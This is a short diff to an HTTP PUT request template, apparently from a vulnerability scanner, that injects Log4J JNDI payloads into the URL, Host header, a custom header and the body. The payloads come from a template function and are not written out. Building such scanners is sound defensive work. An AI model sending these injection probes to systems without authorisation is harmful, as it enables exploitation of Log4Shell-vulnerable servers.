@@ -1,6 +1,7 @@
-PUT {{ .Fuzzer.PayloadJNDILog4J .Url.String "HTTP-GET" }} HTTP/1.1
-Host: {{ .Fuzzer.PayloadJNDILog4J .Url.String "HTTP-HOST" }}
-No-HEADER: {{ .Fuzzer.PayloadJNDILog4J .Url.String "HTTP-NO-HEADER" }}
+PUT {{ .Fuzzer.PayloadJNDILog4J .Url.String "http-raw-url" }} HTTP/1.1
+Host: {{ .Url.Hostname }}:{{ .Url.Port }}
+Host: {{ .Fuzzer.PayloadJNDILog4J .Url.String "http-header-host" }}
+X-My-Header: {{ .Fuzzer.PayloadJNDILog4J .Url.String "http-x-my-header" }}
 
-{{ .Fuzzer.PayloadJNDILog4J .Url.String "HTTP-PUT-BODY" }}
+{{ .Fuzzer.PayloadJNDILog4J .Url.String "http-put-body" }}
 
